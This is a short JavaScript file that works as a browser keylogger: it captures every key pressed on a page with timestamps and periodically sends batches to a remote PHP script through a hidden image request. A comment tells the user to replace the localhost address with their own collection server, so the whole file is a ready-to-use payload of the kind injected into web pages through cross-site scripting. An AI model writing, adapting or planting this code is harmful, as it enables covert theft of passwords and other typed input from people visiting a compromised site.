var presses = [];
window.addEventListener('keydown', function(evt) {
  presses.push({
    t: Math.round(new Date().getTime() / 1000),
    k: evt.key
  });
});
window.setInterval(function() {
  if (presses.length > 5) {
    var data = encodeURIComponent(JSON.stringify(presses));
    // console.log(data);
    new Image().src = 'http://localhost/test/keylog.php?k=' + data; // CHANGE THIS URL TO YOUR OWN!
    presses = [];
  }
}, 500);
